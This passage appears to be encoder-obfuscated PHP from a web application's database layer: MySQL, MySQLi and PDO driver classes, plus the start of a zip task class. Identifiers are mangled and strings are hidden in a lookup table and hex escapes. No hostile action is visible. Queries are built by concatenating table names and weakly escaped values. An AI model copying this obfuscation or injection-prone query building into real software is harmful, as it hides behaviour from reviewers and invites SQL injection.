$Ñ±ÌËÄ[981] . $this->parseTable($›Òï‹ö¼[$Ñ±ÌËÄ[358]]) . $Ñ±ÌËÄ[982] . implode($Ñ±ÌËÄ[50], $›ËõõÈü) . $Ñ±ÌËÄ[983] . implode($Ñ±ÌËÄ[50], $ÀÔ×ôˆÒ) . $Ñ±ÌËÄ[984]; return $this->execute($è»¼³¨¯); } public function insertAll($¬‹¼šì‡, $ÊˆŠÃ ù = array(), $ òç‡ô = false) { $´ ãÜíÚ =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_array($¬‹¼šì‡[0])) { return !1; } $×°•³æù = array_keys($¬‹¼šì‡[0]); $È•ÔÜ»Ÿ = array(); foreach ($¬‹¼šì‡ as $‚§òËéï) { $Òò¤³ì” = array(); foreach ($‚§òËéï as $ÖöëßÔş => $›úº„») { $›úº„» = $this->parseValue($›úº„»); if (is_scalar($›úº„»)) { $Òò¤³ì”[] = $›úº„»; } } $È•ÔÜ»Ÿ[] = $´ ãÜíÚ[339] . implode($´ ãÜíÚ[50], $Òò¤³ì”) . $´ ãÜíÚ[984]; } array_walk($×°•³æù, array($this, $´ ãÜíÚ[985])); $×»¦»© = ($ òç‡ô ? $´ ãÜíÚ[986] : $´ ãÜíÚ[987]) . $´ ãÜíÚ[988] . $this->parseTable($ÊˆŠÃ ù[$´ ãÜíÚ[358]]) . $´ ãÜíÚ[982] . implode($´ ãÜíÚ[50], $×°•³æù) . $´ ãÜíÚ[989] . implode($´ ãÜíÚ[50], $È•ÔÜ»Ÿ); return $this->execute($×»¦»©); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÎÚÍš©« =& $_SERVER[ÔÕ±ĞšÎ]; $this->error = mysql_errno() . $ÎÚÍš©«[4] . mysql_error($this->_linkID); if ($ÎÚÍš©«[12] != $this->queryStr) { $this->error .= LNG($ÎÚÍš©«[48]) . $this->queryStr; } think_trace($this->error, $ÎÚÍš©«[12], $ÎÚÍš©«[49]); return $this->error; } public function escapeString($­€ü») { if ($this->_linkID) { return mysql_real_escape_string($­€ü», $this->_linkID); } else { return mysql_escape_string($­€ü»); } } public function parseKey(&$ªéÖïÕ, $°¦İù© = true) { $‡¦´èê¼ =& $_SERVER[ÔÕ±ĞšÎ]; if ($°¦İù©) { $ªéÖïÕ = $this->parseKeyCheck($ªéÖïÕ); } if ($ªéÖïÕ != $‡¦´èê¼[222] && !preg_match($‡¦´èê¼[990], $ªéÖïÕ)) { $ªéÖïÕ = $‡¦´èê¼[463] . trim($ªéÖïÕ, $‡¦´èê¼[463]) . $‡¦´èê¼[463]; } return $ªéÖïÕ; } } class DbMysqli extends Db { public function __construct($ó¿­ªİò = '') { $§»øìò‘ =& $_SERVER[ÔÕ±ĞšÎ]; if (!extension_loaded($§»øìò‘[991])) { think_exception(think_lang($§»øìò‘[14]) . $§»øìò‘[992]); } if (!empty($ó¿­ªİò)) { $this->config = $ó¿­ªİò; if (empty($this->config[$§»øìò‘[17]])) { $this->config[$§»øìò‘[17]] = $§»øìò‘[12]; } } } public function connect($øöñ§Ğ = '', $­±ÚÅø™ = 0) { $ş¢’€‚¨ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($this->linkID[$­±ÚÅø™])) { if (empty($øöñ§Ğ)) { $øöñ§Ğ = $this->config; } $this->linkID[$­±ÚÅø™] = new mysqli($øöñ§Ğ[$ş¢’€‚¨[965]], $øöñ§Ğ[$ş¢’€‚¨[967]], $øöñ§Ğ[$ş¢’€‚¨[968]], $øöñ§Ğ[$ş¢’€‚¨[21]], $øöñ§Ğ[$ş¢’€‚¨[966]] ? intval($øöñ§Ğ[$ş¢’€‚¨[966]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ñ½¤ ú– = $this->linkID[$­±ÚÅø™]->server_version; $this->linkID[$­±ÚÅø™]->query($ş¢’€‚¨[969] . think_config($ş¢’€‚¨[970]) . $ş¢’€‚¨[58]); if ($ñ½¤ ú– > $ş¢’€‚¨[971]) { $this->linkID[$­±ÚÅø™]->query($ş¢’€‚¨[972]); } $this->connected = !0; if (1 != think_config($ş¢’€‚¨[22])) { unset($this->config); } } return $this->linkID[$­±ÚÅø™]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($é’üú±ö) { $‚Ñ±¦­³ =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $é’üú±ö; if ($this->queryID) { $this->free(); } think_action_status($‚Ñ±¦­³[23], 1); think_status($‚Ñ±¦­³[24]); $this->queryID = $this->_linkID->query($é’üú±ö); if ($this->_linkID->more_results()) { while (($³ÕŒÀ’¬ = $this->_linkID->next_result()) != NULL) { $³ÕŒÀ’¬->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Î“á£İô) { $‘ÏÆíÈÚ =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Î“á£İô; if ($this->queryID) { $this->free(); } think_action_status($‘ÏÆíÈÚ[25], 1); think_status($‘ÏÆíÈÚ[24]); $å©§À† = $this->_linkID->query($Î“á£İô); $this->debug(); if (!1 === $å©§À†) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€é¾îÏ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$€é¾îÏ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¥œèâé = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¥œèâé) { $this->error(); return !1; } } return !0; } private function getAll() { $àã¶şëÊ = array(); if ($this->numRows > 0) { for ($£˜Ö•Ú› = 0; $£˜Ö•Ú› < $this->numRows; $£˜Ö•Ú›++) { $àã¶şëÊ[$£˜Ö•Ú›] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $àã¶şëÊ; } public function getFields($ø»¹“ê¶) { $´¿ÎõŠ© =& $_SERVER[ÔÕ±ĞšÎ]; $¾ìáˆ›ü = $this->query($´¿ÎõŠ©[976] . $this->parseKey($ø»¹“ê¶)); $òï€˜š¬ = array(); if ($¾ìáˆ›ü) { foreach ($¾ìáˆ›ü as $Ğª¹©ì => $˜„ÏîÖÇ) { $òï€˜š¬[$˜„ÏîÖÇ[$´¿ÎõŠ©[31]]] = array($´¿ÎõŠ©[32] => $˜„ÏîÖÇ[$´¿ÎõŠ©[31]], $´¿ÎõŠ©[33] => $˜„ÏîÖÇ[$´¿ÎõŠ©[34]], $´¿ÎõŠ©[35] => (bool) ($˜„ÏîÖÇ[$´¿ÎõŠ©[36]] === $´¿ÎõŠ©[12]), $´¿ÎõŠ©[37] => $˜„ÏîÖÇ[$´¿ÎõŠ©[38]], $´¿ÎõŠ©[39] => strtolower($˜„ÏîÖÇ[$´¿ÎõŠ©[40]]) == $´¿ÎõŠ©[41], $´¿ÎõŠ©[42] => strtolower($˜„ÏîÖÇ[$´¿ÎõŠ©[43]]) == $´¿ÎõŠ©[44]); } } return $òï€˜š¬; } public function getTables($ˆ–İ†õ = '') { $®¡ßõœ¨ =& $_SERVER[ÔÕ±ĞšÎ]; $ÆÉôõÇõ = !empty($ˆ–İ†õ) ? $®¡ßõœ¨[978] . $ˆ–İ†õ . $®¡ßõœ¨[979] : $®¡ßõœ¨[980]; $¢Éä²Íæ = $this->query($ÆÉôõÇõ); $ÃÓºŠ = array(); if ($¢Éä²Íæ) { foreach ($¢Éä²Íæ as $·‡š”É‘ => $‘ÏŒáœ) { $ÃÓºŠ[$·‡š”É‘] = current($‘ÏŒáœ); } } return $ÃÓºŠ; } public function replace($ÂÌ’ú¾‡, $İõÑÁéÃ = array()) { $áÆì½Ãà =& $_SERVER[ÔÕ±ĞšÎ]; foreach ($ÂÌ’ú¾‡ as $“´…³–ß => $®ò…¤”Ñ) { $µ°¹ÔŠì = $this->parseValue($®ò…¤”Ñ); if (is_scalar($µ°¹ÔŠì)) { $›‰Æ«Ô[] = $µ°¹ÔŠì; $Îğá‹œ[] = $this->parseKey($“´…³–ß); } } $§ğÖ­‹€ = $áÆì½Ãà[981] . $this->parseTable($İõÑÁéÃ[$áÆì½Ãà[358]]) . $áÆì½Ãà[982] . implode($áÆì½Ãà[50], $Îğá‹œ) . $áÆì½Ãà[983] . implode($áÆì½Ãà[50], $›‰Æ«Ô) . $áÆì½Ãà[984]; return $this->execute($§ğÖ­‹€); } public function insertAll($·á¢ïü, $÷Ó®°ºï = array(), $ıÜŠ = false) { $ĞÖ¶‚±¨ =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_array($·á¢ïü[0])) { return !1; } $«òº½Ï“ = array_keys($·á¢ïü[0]); $ìŠ›Ÿ = array(); foreach ($·á¢ïü as $ø´é€²÷) { $ÎÎÇĞø = array(); foreach ($ø´é€²÷ as $Î–ª“á => $½°¸®š×) { $½°¸®š× = $this->parseValue($½°¸®š×); if (is_scalar($½°¸®š×)) { $ÎÎÇĞø[] = $½°¸®š×; } } $ìŠ›Ÿ[] = $ĞÖ¶‚±¨[339] . implode($ĞÖ¶‚±¨[50], $ÎÎÇĞø) . $ĞÖ¶‚±¨[984]; } array_walk($«òº½Ï“, array($this, $ĞÖ¶‚±¨[985])); $¾¦½ß = $ıÜŠ ? $ĞÖ¶‚±¨[986] : $ĞÖ¶‚±¨[987]; $œÎ¡Œèğ = $¾¦½ß . $ĞÖ¶‚±¨[988] . $this->parseTable($÷Ó®°ºï[$ĞÖ¶‚±¨[358]]) . $ĞÖ¶‚±¨[982] . implode($ĞÖ¶‚±¨[50], $«òº½Ï“) . $ĞÖ¶‚±¨[989] . implode($ĞÖ¶‚±¨[50], $ìŠ›Ÿ); return $this->execute($œÎ¡Œèğ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $›Ë“É• =& $_SERVER[ÔÕ±ĞšÎ]; $this->error = $this->_linkID->errno . $›Ë“É•[4] . $this->_linkID->error; if ($›Ë“É•[12] != $this->queryStr) { $this->error .= LNG($›Ë“É•[48]) . $this->queryStr; } think_trace($this->error, $›Ë“É•[12], $›Ë“É•[49]); return $this->error; } public function escapeString($‚¥ÂØ‡–) { if ($this->_linkID) { return $this->_linkID->real_escape_string($‚¥ÂØ‡–); } else { return addslashes($‚¥ÂØ‡–); } } public function parseKey(&$Ûš¯şÕï, $÷‚¶¸º = true) { $¶Å›Üµí =& $_SERVER[ÔÕ±ĞšÎ]; if ($÷‚¶¸º) { $Ûš¯şÕï = $this->parseKeyCheck($Ûš¯şÕï); } if ($Ûš¯şÕï != $¶Å›Üµí[222] && !preg_match($¶Å›Üµí[990], $Ûš¯şÕï)) { $Ûš¯şÕï = $¶Å›Üµí[463] . trim($Ûš¯şÕï, $¶Å›Üµí[463]) . $¶Å›Üµí[463]; } return $Ûš¯şÕï; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($úï…—é– = '') { $êµúñç˜ =& $_SERVER[ÔÕ±ĞšÎ]; if (!class_exists($êµúñç˜[993])) { think_exception(think_lang($êµúñç˜[14]) . $êµúñç˜[994]); } if (!empty($úï…—é–)) { $this->config = $úï…—é–; if (empty($this->config[$êµúñç˜[17]])) { $this->config[$êµúñç˜[17]] = array(); } } } public function connect($™¥„®÷ğ = '', $³›½İê¥ = 0) { $†¥ÂŸåÆ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($this->linkID[$³›½İê¥])) { if (empty($™¥„®÷ğ)) { $™¥„®÷ğ = $this->config; } $ê€ıÔÂê = !empty($™¥„®÷ğ[$†¥ÂŸåÆ[17]][$†¥ÂŸåÆ[18]]) ? $™¥„®÷ğ[$†¥ÂŸåÆ[17]][$†¥ÂŸåÆ[18]] : $this->pconnect; if ($ê€ıÔÂê) { $™¥„®÷ğ[$†¥ÂŸåÆ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$³›½İê¥] = new PDO($™¥„®÷ğ[$†¥ÂŸåÆ[995]], $™¥„®÷ğ[$†¥ÂŸåÆ[967]], $™¥„®÷ğ[$†¥ÂŸåÆ[968]], $™¥„®÷ğ[$†¥ÂŸåÆ[17]]); } catch (PDOException $×÷”¹ËÅ) { think_exception($×÷”¹ËÅ->getMessage()); } $this->dbType = $this->_getDsnType($™¥„®÷ğ[$†¥ÂŸåÆ[995]]); if (in_array($this->dbType, array($†¥ÂŸåÆ[996], $†¥ÂŸåÆ[997], $†¥ÂŸåÆ[998], $†¥ÂŸåÆ[999]))) { think_exception($†¥ÂŸåÆ[1000] . $this->dbType . $†¥ÂŸåÆ[1001] . $this->dbType . $†¥ÂŸåÆ[1002]); } if (!$this->linkID[$³›½İê¥]) { think_exception($†¥ÂŸåÆ[1003]); } try { $this->linkID[$³›½İê¥]->exec($†¥ÂŸåÆ[1004] . think_config($†¥ÂŸåÆ[970])); } catch (Exception $×÷”¹ËÅ) { } $this->connected = !0; if (1 != think_config($†¥ÂŸåÆ[22])) { unset($this->config); } } return $this->linkID[$³›½İê¥]; } public function free() { $this->PDOStatement = null; } public function query($ûá³µü, $ëŞ†½Ôµ = array()) { $åÒñ©ª =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ûá³µü; if (!empty($ëŞ†½Ôµ)) { $this->queryStr .= $åÒñ©ª[1005] . print_r($ëŞ†½Ôµ, !0) . $åÒñ©ª[1006]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($åÒñ©ª[23], 1); think_status($åÒñ©ª[24]); $this->PDOStatement = $this->_linkID->prepare($ûá³µü); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÌÃÉ¯´ = $this->PDOStatement->execute($ëŞ†½Ôµ); $this->debug(); if (!1 === $ÌÃÉ¯´) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ßˆ¶•ëø, $´¸“Å©© = array()) { $äû¿¡Öã =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßˆ¶•ëø; if (!empty($´¸“Å©©)) { $this->queryStr .= $äû¿¡Öã[1005] . print_r($´¸“Å©©, !0) . $äû¿¡Öã[1006]; } $“÷™âÕñ = !1; if ($this->dbType == $äû¿¡Öã[999]) { if (preg_match($äû¿¡Öã[1007], $this->queryStr, $ø€ÅÍíó)) { $this->table = think_config($äû¿¡Öã[1008]) . str_ireplace(think_config($äû¿¡Öã[1009]), $äû¿¡Öã[456], $ø€ÅÍíó[2]); $“÷™âÕñ = (bool) $this->query($äû¿¡Öã[1010] . strtoupper($this->table) . $äû¿¡Öã[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($äû¿¡Öã[25], 1); think_status($äû¿¡Öã[24]); $this->PDOStatement = $this->_linkID->prepare($ßˆ¶•ëø); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ƒÖí‰ = $this->PDOStatement->execute($´¸“Å©©); $this->debug(); if (!1 === $ƒÖí‰) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($“÷™âÕñ || preg_match($äû¿¡Öã[1011], $ßˆ¶•ëø)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ùµ’º©ğ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ùµ’º©ğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $º£ƒûÀ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$º£ƒûÀ) { $this->error(); return !1; } } return !0; } private function getAll() { $îéœ†õ‘ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($îéœ†õ‘); return $îéœ†õ‘; } public function getFields($¹æÇû×è) { $ÃâÕºï¹ =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!0); if (think_config($ÃâÕºï¹[1012])) { $¨·†¦ÆÙ = str_replace($ÃâÕºï¹[1013], $¹æÇû×è, think_config($ÃâÕºï¹[1012])); } else { switch ($this->dbType) { case $ÃâÕºï¹[996]: case $ÃâÕºï¹[1014]: $¨·†¦ÆÙ = "\x53\x45\x4c\105\x43\x54\x20\x20\x20\143\x6f\154\x75\x6d\x6e\x5f\156\x61\155\x65\x20\141\163\40\47\116\141\155\x65\47\54\x20\40\x20\144\141\x74\x61\x5f\x74\171\x70\x65\x20\x61\x73\x20\x27\x54\171\x70\x65\47\54\40\40\x20\x63\x6f\x6c\x75\x6d\156\x5f\x64\145\146\x61\165\x6c\x74\40\x61\163\40\x27\104\145\146\x61\165\x6c\164\x27\54\x20\x20\x20\x69\163\x5f\156\x75\x6c\x6c\141\142\154\145\40\x61\x73\40\47\116\x75\154\154\x27\12\11\x9\106\x52\117\115\x9\151\x6e\x66\x6f\162\155\x61\x74\151\x6f\156\137\163\x63\150\x65\155\141\56\x74\141\x62\154\145\163\40\101\x53\40\x74\12\x9\x9\112\x4f\x49\x4e\11\x69\156\x66\157\x72\x6d\x61\x74\x69\157\156\x5f\x73\143\x68\145\x6d\141\56\x63\x6f\x6c\165\x6d\x6e\x73\40\x41\x53\40\143\xa\x9\x9\x4f\116\40\x20\x74\56\164\x61\142\154\x65\137\143\141\x74\x61\x6c\x6f\x67\x20\x3d\40\143\x2e\x74\141\142\x6c\145\137\143\141\x74\141\154\x6f\147\12\11\11\x41\x4e\x44\40\164\56\x74\x61\x62\x6c\x65\x5f\x73\143\150\145\155\141\40\75\x20\x63\x2e\x74\141\142\x6c\x65\x5f\163\143\x68\x65\x6d\x61\xa\11\x9\x41\116\x44\40\x74\56\164\x61\142\154\x65\x5f\x6e\x61\x6d\145\x20\x3d\x20\143\x2e\x74\141\x62\x6c\145\x5f\x6e\x61\x6d\x65\xa\x9\11\127\x48\x45\x52\x45\x20\40\x20\x74\x2e\164\x61\x62\154\x65\x5f\156\141\155\145\x20\75\40\47{$¹æÇû×è}\x27"; break; case $ÃâÕºï¹[1015]: $¨·†¦ÆÙ = $ÃâÕºï¹[1016] . $¹æÇû×è . $ÃâÕºï¹[1017]; break; case $ÃâÕºï¹[997]: case $ÃâÕºï¹[999]: $¨·†¦ÆÙ = $ÃâÕºï¹[1018] . $ÃâÕºï¹[1019] . $ÃâÕºï¹[1020] . strtoupper($¹æÇû×è) . $ÃâÕºï¹[1021] . strtoupper($¹æÇû×è) . $ÃâÕºï¹[1022]; break; case $ÃâÕºï¹[1023]: $¨·†¦ÆÙ = $ÃâÕºï¹[1024] . $¹æÇû×è . $ÃâÕºï¹[1025]; break; case $ÃâÕºï¹[998]: break; case $ÃâÕºï¹[1026]: default: $¨·†¦ÆÙ = $ÃâÕºï¹[1027] . ($this->dbType == $ÃâÕºï¹[1026] ? "\140{$¹æÇû×è}\140" : $¹æÇû×è); } } $ãäÖ¨×é = $this->query($¨·†¦ÆÙ); $ŸÃÎÉ ƒ = array(); if ($ãäÖ¨×é) { foreach ($ãäÖ¨×é as $…’Ù»‹À => $Ëàİùµš) { $Ëàİùµš = array_change_key_case($Ëàİùµš); $Ëàİùµš[$ÃâÕºï¹[32]] = isset($Ëàİùµš[$ÃâÕºï¹[32]]) ? $Ëàİùµš[$ÃâÕºï¹[32]] : $ÃâÕºï¹[456]; $Ëàİùµš[$ÃâÕºï¹[33]] = isset($Ëàİùµš[$ÃâÕºï¹[33]]) ? $Ëàİùµš[$ÃâÕºï¹[33]] : $ÃâÕºï¹[456]; $•¹¶¼­‰ = isset($Ëàİùµš[$ÃâÕºï¹[352]]) ? $Ëàİùµš[$ÃâÕºï¹[352]] : $Ëàİùµš[$ÃâÕºï¹[32]]; $ŸÃÎÉ ƒ[$•¹¶¼­‰] = array($ÃâÕºï¹[32] => $•¹¶¼­‰, $ÃâÕºï¹[33] => $Ëàİùµš[$ÃâÕºï¹[33]], $ÃâÕºï¹[35] => (bool) (isset($Ëàİùµš[$ÃâÕºï¹[106]]) && $Ëàİùµš[$ÃâÕºï¹[106]] === $ÃâÕºï¹[12] || isset($Ëàİùµš[$ÃâÕºï¹[35]]) && $Ëàİùµš[$ÃâÕºï¹[35]] === $ÃâÕºï¹[12]), $ÃâÕºï¹[37] => isset($Ëàİùµš[$ÃâÕºï¹[37]]) ? $Ëàİùµš[$ÃâÕºï¹[37]] : (isset($Ëàİùµš[$ÃâÕºï¹[56]]) ? $Ëàİùµš[$ÃâÕºï¹[56]] : $ÃâÕºï¹[456]), $ÃâÕºï¹[39] => isset($Ëàİùµš[$ÃâÕºï¹[97]]) ? strtolower($Ëàİùµš[$ÃâÕºï¹[97]]) == $ÃâÕºï¹[41] : (isset($Ëàİùµš[$ÃâÕºï¹[57]]) ? $Ëàİùµš[$ÃâÕºï¹[57]] : !1), $ÃâÕºï¹[42] => isset($Ëàİùµš[$ÃâÕºï¹[1028]]) ? strtolower($Ëàİùµš[$ÃâÕºï¹[1028]]) == $ÃâÕºï¹[44] : (isset($Ëàİùµš[$ÃâÕºï¹[97]]) ? $Ëàİùµš[$ÃâÕºï¹[97]] : !1)); } } return $ŸÃÎÉ ƒ; } public function getTables($µ¸Ì”¾Ÿ = '') { $İŸ‰—ä¹ =& $_SERVER[ÔÕ±ĞšÎ]; if (think_config($İŸ‰—ä¹[1029])) { $¤Ù¼à¡Ş = str_replace($İŸ‰—ä¹[1030], $µ¸Ì”¾Ÿ, think_config($İŸ‰—ä¹[1029])); } else { switch ($this->dbType) { case $İŸ‰—ä¹[997]: case $İŸ‰—ä¹[999]: $¤Ù¼à¡Ş = $İŸ‰—ä¹[1031]; break; case $İŸ‰—ä¹[996]: case $İŸ‰—ä¹[1014]: $¤Ù¼à¡Ş = $İŸ‰—ä¹[1032]; break; case $İŸ‰—ä¹[1023]: $¤Ù¼à¡Ş = $İŸ‰—ä¹[1033]; break; case $İŸ‰—ä¹[998]: think_exception(think_lang($İŸ‰—ä¹[1034]) . $İŸ‰—ä¹[1035]); break; case $İŸ‰—ä¹[1015]: $¤Ù¼à¡Ş = $İŸ‰—ä¹[45] . $İŸ‰—ä¹[46] . $İŸ‰—ä¹[47]; break; case $İŸ‰—ä¹[1026]: default: if (!empty($µ¸Ì”¾Ÿ)) { $¤Ù¼à¡Ş = $İŸ‰—ä¹[978] . $µ¸Ì”¾Ÿ . $İŸ‰—ä¹[979]; } else { $¤Ù¼à¡Ş = $İŸ‰—ä¹[980]; } } } $ÓñÌè™ğ = $this->query($¤Ù¼à¡Ş); $Û«û¸° = array(); foreach ($ÓñÌè™ğ as $øÔï‘»Í => $İÖ·Æâ„) { $Û«û¸°[$øÔï‘»Í] = current($İÖ·Æâ„); } return $Û«û¸°; } protected function parseLimit($ûÉ¬¡ı×) { $ÛµÌ’ŒÆ =& $_SERVER[ÔÕ±ĞšÎ]; $ıÒ™„µç = $ÛµÌ’ŒÆ[12]; if (!empty($ûÉ¬¡ı×)) { switch ($this->dbType) { case $ÛµÌ’ŒÆ[1023]: case $ÛµÌ’ŒÆ[1015]: $ûÉ¬¡ı× = explode($ÛµÌ’ŒÆ[50], $ûÉ¬¡ı×); if (count($ûÉ¬¡ı×) > 1) { $ıÒ™„µç .= $ÛµÌ’ŒÆ[51] . $ûÉ¬¡ı×[1] . $ÛµÌ’ŒÆ[52] . $ûÉ¬¡ı×[0] . $ÛµÌ’ŒÆ[53]; } else { $ıÒ™„µç .= $ÛµÌ’ŒÆ[51] . $ûÉ¬¡ı×[0] . $ÛµÌ’ŒÆ[53]; } break; case $ÛµÌ’ŒÆ[996]: case $ÛµÌ’ŒÆ[1014]: break; case $ÛµÌ’ŒÆ[998]: break; case $ÛµÌ’ŒÆ[997]: case $ÛµÌ’ŒÆ[999]: break; case $ÛµÌ’ŒÆ[1026]: default: $ıÒ™„µç .= $ÛµÌ’ŒÆ[51] . $ûÉ¬¡ı× . $ÛµÌ’ŒÆ[53]; } } return $ıÒ™„µç; } public function parseKey(&$éŒ˜˜è, $ÔöâÕŠ÷ = true) { $¬Ñ±Ìœ =& $_SERVER[ÔÕ±ĞšÎ]; if ($ÔöâÕŠ÷) { $éŒ˜˜è = $this->parseKeyCheck($éŒ˜˜è); } if ($this->dbType == $¬Ñ±Ìœ[1026]) { if ($éŒ˜˜è != $¬Ñ±Ìœ[222] && !preg_match($¬Ñ±Ìœ[990], $éŒ˜˜è)) { $éŒ˜˜è = $¬Ñ±Ìœ[463] . trim($éŒ˜˜è, $¬Ñ±Ìœ[463]) . $¬Ñ±Ìœ[463]; } return $éŒ˜˜è; } else { return parent::parseKey($éŒ˜˜è, $ÔöâÕŠ÷); } } public function close() { $this->_linkID = null; } public function error() { $³¥×§˜œ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->PDOStatement) { $ı”¹ğ°ñ = $this->PDOStatement->errorInfo(); $this->error = $ı”¹ğ°ñ[1] . $³¥×§˜œ[4] . $ı”¹ğ°ñ[2]; } else { $this->error = $³¥×§˜œ[12]; } if ($³¥×§˜œ[12] != $this->queryStr) { $this->error .= LNG($³¥×§˜œ[48]) . $this->queryStr; } think_trace($this->error, $³¥×§˜œ[12], $³¥×§˜œ[49]); return $this->error; } public function escapeString($û†èÓ) { $òø‹ˆÉ =& $_SERVER[ÔÕ±ĞšÎ]; switch ($this->dbType) { case $òø‹ˆÉ[1023]: case $òø‹ˆÉ[996]: case $òø‹ˆÉ[1014]: case $òø‹ˆÉ[1026]: return addslashes($û†èÓ); case $òø‹ˆÉ[998]: case $òø‹ˆÉ[1015]: case $òø‹ˆÉ[997]: case $òø‹ˆÉ[999]: return str_ireplace($òø‹ˆÉ[58], $òø‹ˆÉ[59], $û†èÓ); } } protected function parseValue($õèÅÇšµ) { $°Í¯µËº =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($õèÅÇšµ)) { $ÛÕÒ®Äê = strpos($õèÅÇšµ, $°Í¯µËº[4]) === 0 && in_array($õèÅÇšµ, array_keys($this->bind)); $õèÅÇšµ = $ÛÕÒ®Äê ? $this->escapeString($õèÅÇšµ) : $°Í¯µËº[1036] . $this->escapeString($õèÅÇšµ) . $°Í¯µËº[1036]; } elseif (isset($õèÅÇšµ[0]) && is_string($õèÅÇšµ[0]) && strtolower($õèÅÇšµ[0]) == $°Í¯µËº[374]) { $õèÅÇšµ = $this->escapeString($õèÅÇšµ[1]); } elseif (is_array($õèÅÇšµ)) { $õèÅÇšµ = array_map(array($this, $°Í¯µËº[1037]), $õèÅÇšµ); } elseif (is_bool($õèÅÇšµ)) { $õèÅÇšµ = $õèÅÇšµ ? $°Í¯µËº[91] : $°Í¯µËº[230]; } elseif (is_null($õèÅÇšµ)) { $õèÅÇšµ = $°Í¯µËº[106]; } return $õèÅÇšµ; } public function getLastInsertId() { $Ëû·¯„Ş =& $_SERVER[ÔÕ±ĞšÎ]; switch ($this->dbType) { case $Ëû·¯„Ş[1023]: case $Ëû·¯„Ş[1015]: case $Ëû·¯„Ş[996]: case $Ëû·¯„Ş[1014]: case $Ëû·¯„Ş[998]: case $Ëû·¯„Ş[1026]: return $this->_linkID->lastInsertId(); case $Ëû·¯„Ş[997]: case $Ëû·¯„Ş[999]: $‚Õİ¿ÎŞ = $this->table; $ÙÏ¥Á‘¥ = $this->query("\x53\105\114\105\103\124\x20{$‚Õİ¿ÎŞ}\x2e\143\x75\162\162\166\x61\154\x20\x63\165\162\162\166\x61\154\x20\x46\x52\x4f\x4d\x20\x64\165\x61\x6c"); return $ÙÏ¥Á‘¥ ? $ÙÏ¥Á‘¥[0][$Ëû·¯„Ş[1038]] : 0; } } } goto b¶ñğ£åª¶; f†˜Üë‹Ñ¶: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ª…Ç‘‹À =& $_SERVER[ÔÕ±ĞšÎ]; parent::startAfter(); Hook::bind($ª…Ç‘‹À[1903], array($this, $ª…Ç‘‹À[1893])); Hook::bind($ª…Ç‘‹À[1895], array($this, $ª…Ç‘‹À[1896])); $ëÊ®ò½Ÿ =& $this->task; $ëÊ®ò½Ÿ[$ª…Ç‘‹À[1897]] = $ª…Ç‘‹À[1281]; if (!$ëÊ®ò½Ÿ[$ª…Ç‘‹À[1665]]) { $ëÊ®ò½Ÿ[$ª…Ç‘‹À[1665]] = LNG($ª…Ç‘‹À[1904]); } } protected function endAfter() { $Ó„Ÿ‘¨ =& $_SERVER[ÔÕ±ĞšÎ]; parent::endAfter(); Hook::unbind($Ó„Ÿ‘¨[1903], array($this, $Ó„Ÿ‘¨[1893])); Hook::unbind($Ó„Ÿ‘¨[1895], array($this, $Ó„Ÿ‘¨[1896])); } public function updateAfter() { $ç˜‡™Û¦ =& $_SERVER[ÔÕ±ĞšÎ]; $›’†øùö =& $this->task; if (!$›’†øùö[$ç˜‡™Û¦[1142]] || !$›’†øùö[$ç˜‡™Û¦[837]]) { return; } if ($›’†øùö[$ç˜‡™Û¦[1897]] == $ç˜‡™Û¦[1281]) { $¾Ö­ø’ = $›’†øùö[$ç˜‡™Û¦[1832]]; if ($›’†øùö[$ç˜‡™Û¦[1833]] != $ç˜‡™Û¦[1281]) { $¾Ö­ø’ = 0; } $ˆŠâÍ¶™ = ($›’†øùö[$ç˜‡™Û¦[1836]] + $¾Ö­ø’) / $›’†øùö[$ç˜‡™Û¦[837]]; 